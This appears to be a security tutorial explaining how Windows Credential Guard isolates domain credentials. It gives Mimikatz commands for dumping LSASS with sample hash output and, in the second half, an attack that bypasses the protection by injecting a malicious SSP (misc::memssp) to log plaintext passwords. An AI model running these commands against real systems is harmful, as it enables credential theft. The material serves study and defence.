**Credential Guard** is a defensive mechanism introduced by Microsoft to protect sensitive authentication material, specifically **domain credentials**, from being accessed through traditional memory dumping techniques.

In standard Windows systems, credentials such as NTLM hashes are stored in the memory of the `lsass.exe` process. Tools like Mimikatz abuse this by reading LSASS memory and extracting reusable credentials. Credential Guard changes this behavior by isolating secrets in a protected memory region, effectively breaking this attack path.

---

## Internal Architecture and Isolation Mechanism

Credential Guard relies on **Virtualization-Based Security (VBS)**, which uses hardware virtualization features to create isolated execution environments.

Instead of storing credentials directly in LSASS memory, Windows introduces a separate process:

- `LSASS.exe` (normal process, VTL0)
    
- `LSAISO.exe` (isolated process, VTL1)
    

The sensitive data is stored inside `LSAISO.exe`, which runs in a more privileged and isolated environment.

### Virtual Trust Levels (VTL)

Windows splits execution into logical levels:

- **VTL0**: Regular OS (userland + kernel)
    
- **VTL1**: Secure environment (Credential Guard)
    

Even if an attacker obtains **SYSTEM privileges**, they remain in VTL0 and cannot directly access memory in VTL1.

---

## Impact on Credential Dumping

When Credential Guard is not enabled, dumping credentials is straightforward:

```bash
mimikatz
privilege::debug
sekurlsa::logonpasswords
```

Typical output:

```text
Username : Administrator
Domain   : CORP
NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
```

With Credential Guard enabled, the same command produces:

```text
* LSA Isolated Data: NtlmHash
  Encrypted : 6ad536994213cea0...
```

The hash is no longer directly accessible. Instead, it is stored encrypted and cannot be reused for attacks like Pass-the-Hash.

---

## Identifying Credential Guard on a Target

You can verify if Credential Guard is enabled using PowerShell:

```powershell
Get-ComputerInfo
```

Relevant output:

```text
DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
HyperVisorPresent                  : True
```

This confirms that credential isolation is active.

---

## Practical Limitation for Attackers

Credential Guard introduces a key constraint:

- Post-compromise credential dumping becomes ineffective for **domain accounts**
    
- Attackers cannot extract NTLM hashes from LSASS memory
    

However, it is important to understand that:

- **Local account hashes are still accessible**
    
- Only domain credentials are protected
    

---

## Alternative Attack Strategy: Credential Interception

Since stored credentials cannot be extracted, the attack must shift from **post-authentication dumping** to **real-time interception**.

Windows authentication relies on the **Security Support Provider Interface (SSPI)**, which loads authentication modules (SSPs). These modules handle authentication requests and receive credentials during login.

An attacker can abuse this mechanism by injecting a malicious SSP.

### Injecting an SSP with Mimikatz

Mimikatz provides a module for this:

```bash
mimikatz
privilege::debug
misc::memssp
```

This injects a malicious SSP into LSASS memory without writing to disk.

---

## Capturing Credentials in Plaintext

Once the SSP is injected, any new authentication event will be logged.

After a user logs in, credentials are written to:

```text
C:\Windows\System32\mimilsa.log
```

Example output:

```text
CORP\Administrator  ADMIN!@#
CLIENT\Lab  lab
```

This provides plaintext credentials, bypassing the need for hash extraction entirely.
